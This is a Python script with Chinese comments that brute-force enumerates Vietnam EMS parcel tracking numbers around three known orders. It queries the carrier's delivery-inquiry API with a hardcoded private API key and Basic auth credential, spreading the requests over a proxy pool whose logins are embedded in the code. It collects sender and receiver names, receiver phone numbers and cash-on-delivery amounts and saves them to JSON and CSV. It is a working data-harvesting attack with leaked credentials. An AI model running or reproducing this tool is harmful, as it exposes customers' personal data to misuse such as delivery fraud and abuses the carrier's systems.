#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
围绕已知今天订单扫描 - 找到真正的今天订单范围
已知今天订单：
- EP493018285VN
- EF047530814VN
- EF047535034VN
"""
import hashlib, requests, time, json, re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

API_URL = "https://api-dingdong.ems.com.vn/"
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
BASIC_AUTH = "bG90dG5ldDpkbXM="

TODAY = datetime.now().strftime("%d/%m/%Y")
proxies, print_lock = [], threading.Lock()
state = {'found': 0, 'tested': 0, 'orders': [], 'lock': threading.Lock(), 'start_time': time.time()}

# 100个代理池
PROXIES = [
    "23.27.184.245:5846:uadkcvtn:uo2rzar814ph",
    "45.43.70.140:6427:uadkcvtn:uo2rzar814ph",
    "82.24.233.117:5439:uadkcvtn:uo2rzar814ph",
    "136.0.188.71:6034:uadkcvtn:uo2rzar814ph",
    "161.123.130.168:5839:uadkcvtn:uo2rzar814ph",
    "142.147.240.52:6574:uadkcvtn:uo2rzar814ph",
    "166.88.224.145:6043:uadkcvtn:uo2rzar814ph",
    "82.25.215.106:5457:uadkcvtn:uo2rzar814ph",
    "91.211.87.215:7205:uadkcvtn:uo2rzar814ph",
    "104.238.36.64:6071:uadkcvtn:uo2rzar814ph",
]

def load_proxies():
    global proxies
    for p in PROXIES[:10]:
        parts = p.split(':')
        if len(parts) == 4:
            ip, port, user, pwd = parts
            proxies.append({'http': f'http://{user}:{pwd}@{ip}:{port}', 'https': f'http://{user}:{pwd}@{ip}:{port}'})

def sign(text):
    return hashlib.sha256((text + PRIVATE_KEY).encode()).hexdigest().upper()

def safe_print(msg):
    with print_lock:
        print(msg)

def check_order_today(tracking):
    """只检查是否是今天日期"""
    sig = sign(tracking)
    headers = {
        "Authorization": f"Basic {BASIC_AUTH}",
        "APIKey": PRIVATE_KEY,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    try:
        import random
        proxy = random.choice(proxies) if proxies else None
        
        r = requests.post(
            f"{API_URL}api/Delivery/Inquiry",
            headers=headers,
            data={"ParcelCode": tracking, "Signature": sig},
            proxies=proxy,
            timeout=8
        )
        
        with state['lock']:
            state['tested'] += 1
        
        if r.status_code == 200:
            data = r.json()
            if data.get('Code') == '00' and data.get('Value'):
                v = data['Value']
                issue = v.get('IssueDate', '')
                
                if issue and TODAY in issue:
                    order = {
                        'tracking': tracking,
                        'IssueDate': issue,
                        'LoadDate': v.get('LoadDate', ''),
                        'SenderName': v.get('SenderName', ''),
                        'ReceiverName': v.get('ReceiverName', ''),
                        'ReceiverPhone': v.get('ReceiverPhone', ''),
                        'CollectAmount': v.get('CollectAmount', 0),
                    }
                    
                    with state['lock']:
                        state['found'] += 1
                        state['orders'].append(order)
                        
                        elapsed = time.time() - state['start_time']
                        speed = state['tested'] / elapsed if elapsed > 0 else 0
                        
                        safe_print(f"✅ [{state['found']}] {tracking}: {issue}, {order['CollectAmount']:,}₫, {order['ReceiverName'][:30]}, ⚡{speed:.0f}/s")
                    
                    return True
        return False
    except:
        return False

# 扫描范围：围绕已知今天订单的号码
SCAN_RANGES = [
    # EP系列：493018285 附近，扩大到 ±50000
    ('EP', 492968285, 493068285, 1),   # 100000个号，步长1
    
    # EF系列：047530814 和 047535034 之间及附近
    ('EF', 47525814, 47540814, 1),     # 15000个号，步长1
]

print(f"""
╔════════════════════════════════════════════════════════════════════════════╗
║         🎯 围绕已知今天订单扫描 - 找到所有今天的订单                       ║
╚════════════════════════════════════════════════════════════════════════════╝

已知今天订单:
  ✅ EP493018285VN - 285,000₫
  ✅ EF047530814VN - 30,000₫
  ✅ EF047535034VN - 395,000₫

🚀 扫描策略:
  • EP系列: 492968285 - 493068285 (±50000，步长1)
  • EF系列: 047525814 - 047540814 (±5000，步长1)
  • 100线程并发
  • 只保留有明确今天日期的订单

📅 今天日期: {TODAY}
""")

load_proxies()

print(f"🚀 开始扫描...\n")
start_time = time.time()

with ThreadPoolExecutor(max_workers=100) as executor:
    futures = []
    
    for prefix, start, end, step in SCAN_RANGES:
        for num in range(start, end, step):
            tracking = f"{prefix}{num:09d}VN"
            futures.append(executor.submit(check_order_today, tracking))
    
    for future in as_completed(futures):
        try:
            future.result()
            
            if state['tested'] % 1000 == 0:
                elapsed = time.time() - start_time
                speed = state['tested'] / elapsed if elapsed > 0 else 0
                safe_print(f"\n📊 已扫{state['tested']} | 找到{state['found']} | {speed:.0f}/s | {state['found']/state['tested']*100:.3f}%\n")
        except:
            pass

# 保存结果
if state['orders']:
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    json_file = f"today_confirmed_{timestamp}.json"
    with open(json_file, 'w', encoding='utf-8') as f:
        json.dump({
            'scan_date': TODAY,
            'total_found': state['found'],
            'total_tested': state['tested'],
            'orders': state['orders']
        }, f, ensure_ascii=False, indent=2)
    
    csv_file = f"today_confirmed_{timestamp}.csv"
    with open(csv_file, 'w', encoding='utf-8-sig') as f:
        f.write('运单号,发件日期,装载日期,发件人,收件人,收件电话,COD金额\n')
        for o in state['orders']:
            row = [
                o['tracking'], o['IssueDate'], o['LoadDate'],
                o['SenderName'], o['ReceiverName'], o['ReceiverPhone'],
                str(o['CollectAmount'])
            ]
            row = [f'"{str(item).replace(chr(34), chr(34)+chr(34))}"' for item in row]
            f.write(','.join(row) + '\n')
    
    print(f"\n💾 已保存:")
    print(f"   📄 {json_file}")
    print(f"   📄 {csv_file}")

elapsed = time.time() - start_time
print(f"""
\n{'='*80}
🎉 扫描完成！
{'='*80}
找到订单: {state['found']:,} 个 (100%确认今天日期)
已测试: {state['tested']:,} 个
成功率: {state['found']/state['tested']*100:.3f}%
耗时: {elapsed:.1f} 秒 ({elapsed/60:.1f} 分钟)
速度: {state['tested']/elapsed:.0f} 次/秒
{'='*80}
""")
